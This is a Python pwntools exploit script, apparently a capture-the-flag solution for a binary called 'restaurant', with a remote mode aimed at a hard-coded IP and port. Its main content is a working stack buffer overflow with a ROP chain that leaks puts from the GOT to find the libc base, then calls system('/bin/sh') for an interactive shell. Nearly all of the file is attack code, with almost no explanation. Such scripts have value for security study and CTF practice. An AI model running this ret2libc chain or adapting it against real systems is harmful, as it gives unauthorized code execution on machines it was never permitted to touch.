#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './restaurant'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '178.128.45.143', 31324

def start(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = start()
rop = ROP(exe)

# Got manually through cyclic gdb-pwndbg
offset = 40

io.sendlineafter(b'>', b'1')

# flattening  payload here
payload = flat({
    offset: [
        rop.rdi.address,
        elf.got['puts'],
        elf.plt['puts'],
        elf.sym['fill']
    ]
})

# sending payload
io.sendlineafter(b'>', payload)
io.recvline()
io.recvuntil(b'jaaa')

puts = unpack(io.recvline()[3:-1].ljust(8, b'\x00'))
libc.address = puts - libc.sym['puts']
binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym['system']

info('GOT-puts: %#x', puts)
info('libc base: %#x', libc.address)
info('binsh: %#x', binsh)
info('system: %#x', system)

payload = flat({
    offset: [
        rop.rdi.address,
        binsh,
        rop.ret.address,
        system
    ]
})

# sending payload
io.sendlineafter(b'>', payload)

io.interactive()